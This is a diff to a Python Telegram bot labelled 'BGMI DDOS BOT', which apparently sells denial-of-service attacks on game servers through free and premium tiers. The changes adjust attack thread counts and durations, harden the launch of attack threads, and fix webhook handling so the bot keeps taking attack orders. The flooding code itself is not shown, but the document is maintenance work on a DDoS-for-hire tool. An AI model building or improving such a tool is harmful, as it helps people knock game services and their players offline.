@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 """
 💀 BGMI DDOS BOT - ULTRA PRO
-🔥 REAL WORKING ATTACK ENGINE
-📸 JAISA SCREENSHOT MEIN THA
 """
 
 import os
@@ -32,6 +30,14 @@ logger = logging.getLogger(__name__)
 
 # ═══════════════ BOT ═══════════════
 bot = telebot.TeleBot(TOKEN)
+
+# 🔥 Remove webhook before starting
+try:
+    bot.remove_webhook()
+    print("✅ Webhook removed!")
+except:
+    pass
+
 print("✅ Bot Initialized!")
 
 # ═══════════════ ATTACK INSTANCE ═══════════════
@@ -167,12 +173,13 @@ Example:
             bot.reply_to(message, "❌ Invalid time!")
             return
         
+        # 🔥 SAFE THREAD LIMITS
         if is_premium:
             max_time = 600
-            threads = 5000
+            threads = 1500
         else:
             max_time = 60
-            threads = 1000
+            threads = 800
         
         if dur > max_time:
             dur = max_time
@@ -214,7 +221,13 @@ Example:
                 bot.send_message(user_id, f"❌ Attack Failed: {e}")
                 print(f"❌ Attack error: {e}")
         
-        Thread(target=run_attack).start()
+        try:
+            Thread(target=run_attack).start()
+        except Exception as e:
+            bot.reply_to(message, f"⚠️ System busy, try again")
+            print(f"❌ Thread error: {e}")
+            attacking = False
+            return
         
         reply_text = f"""
 💀 **ATTACK LAUNCHED**
@@ -705,7 +718,7 @@ if __name__ == '__main__':
 ║  💀 BGMI DDOS BOT - ULTRA PRO       ║
 ║  🔥 REAL WORKING ATTACK ENGINE      ║
 ║  📸 JAISA SCREENSHOT MEIN THA       ║
-║  ✅ JSON DATABASE (NO MONGODB ISSUE)║
+║  ✅ JSON DATABASE                   ║
 ║  ✅ ALL COMMANDS WORKING            ║
 ╚══════════════════════════════════════╝
 """)
@@ -715,6 +728,7 @@ if __name__ == '__main__':
     print("📁 Database: database.json")
     
     try:
+        bot.remove_webhook()
         bot.polling(none_stop=True)
     except Exception as e:
         print(f"❌ Bot Error: {e}")
